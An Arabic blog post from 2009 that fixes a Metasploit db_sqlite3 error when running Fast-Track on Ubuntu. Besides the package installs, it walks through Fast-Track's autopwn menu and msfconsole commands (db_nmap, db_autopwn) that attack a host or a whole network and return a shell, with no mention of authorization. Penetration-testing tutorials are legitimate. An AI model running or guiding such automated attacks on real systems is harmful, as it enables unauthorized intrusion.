---
title: "حل مشكلة db_sqlite3 عند تشغيل Fast-Track على Ubuntu"
date: 2009-02-17 04:20:32 -0500
categories: ["Database", "PenTest", "Security"]
tags: ["Aircrack-NG", "apt-get", "Autopwn", "Fast-Track", "Metasploit", "Milw0rm", "msfconsole", "Nikto", "PenTest", "sqlite3", "SQLMap", "sudo", "W3AF"]
permalink: "/2009/02/17/solution-for-launching-db_sqlite3-when-running-fast-track-on-ubuntu/"
reading_time: 3
---

السلام عليكم ورحمة الله وبركاته

قد يكون أحدكم قد قام بتثبيت [Metasploit](http://www.metasploit.com/) وأيضاً [Fast-Track](http://thepentest.com/) على توزيعة Ubuntu وعند تشغيله لـ Fast-Track واجه مشاكل مثل هذه:

msf > load db_sqlite3

[-] Error while running command load: no such file to load -- sqlite3

msf > db_destroy pentest

[-] Unknown command: db_destroy.

msf > db_create pentest

[-] Unknown command: db_create.

msf > db_nmap 172.16.0.55

[-] Unknown command: db_nmap.

msf > db_autopwn -p -t -e

[-] Unknown command: db_autopwn.

لا تقلق حلها بسيط إن شاء الله … أول شي تأكد من تنصيب Metasploit و Fast-Track في نفس المجلد (هذه كما يقولون recommended) … بعد ذلك قم بالتأكد من تركيب الأدوات التالية:

sudo apt-get install build-essential ruby libruby rdoc libyaml-ruby libzlib-ruby libopenssl-ruby libdl-ruby libreadline-ruby libiconv-ruby rubygems

وهذه:

sudo apt-get install sqlite3 libsqlite3-dev libsqlite3-ruby libdbd-sqlite3-ruby

بعد ذلك أذهب الى المجلد الذي فيه Metasploit:

cd /path2/metasploit/

ونفذ التالي:

$ sudo ./fast-track.py -i

ستظهر لك قائمة بالخيارات، أنصحك بالبداية أن تقوم بعمل تحديث لكل شيء (Fast-Track و Metasploit 3 و Aircrack-NG و Nikto Plugin و W3AF و SQLMap و Milw0rm) … وعليه قم بإختيار الخيار الأول في القائمة الأولى (1) … بعد ذلك أختر الخيار (9) والذي هو Update Everything … سيأخذ بعض الوقت وبعدها سينتهي من التحديث ويصبح لديك كل ما ذكرتهم محدثين بآخر الإصدارات …

الآن لتشغيل أبسط هجوم مثلاً على الشبكة لديك بواسطة Fast-Track … قم بالرجوع الى القائمة السابقة بالخيار (10) … وبعد ذلك قم بإختيار الخيار (2) External Hacking … والآن قم بإختيار الخيار (3) Autopwn Metasploit Automated … ومن ثم الخيار (1) Run Metasploit Autopwn … وأخيراً قم بتحديد المجال الخاص بالشبكة التي تريد تنفذ هذا الهجوم عليها … طبعاً يوجد أمثلة موضحة لك حول ذلك … لا تقلق كل شيء سهل للغاية … بعد ان ينتهي من تنفيذ، إن قام بالحصول على نتائج سيعيد لك shell على الجهاز الذي تم إختراقه …

طبعاً إن أحببت تجربة الأوامر هذه بشكل مباشرة من msfconsole … فكل ما عليك فعله هو تشغيل الـ console وهذا يمكنك عمله من Fast-Track نفسها … أو قم بالخروج وتشغيله بشكل مباشر:

sudo ./msfconsole

بعد ذلك نفذ الأوامر التالية:

load db_sqlite3

db_destroy pentest

db_create pentest

db_nmap 172.16.0.55

db_autopwn -p -t -e

حيث سيقوم بتنفيذ الهجوم على الجهاز 172.16.0.55 (حددت جهاز واحد) … تستطيع أن تحدد الشبكة كلها بواسطة 172.16.0.0/16 وهكذا …

إن شاء الله أكون وفقت في مساعدة من واجه مثل هذه المشكلة …

مراجع: [Fast-Track](http://thepentest.com/) | [Metasploit](http://www.metasploit.com/)

دمتم بود …
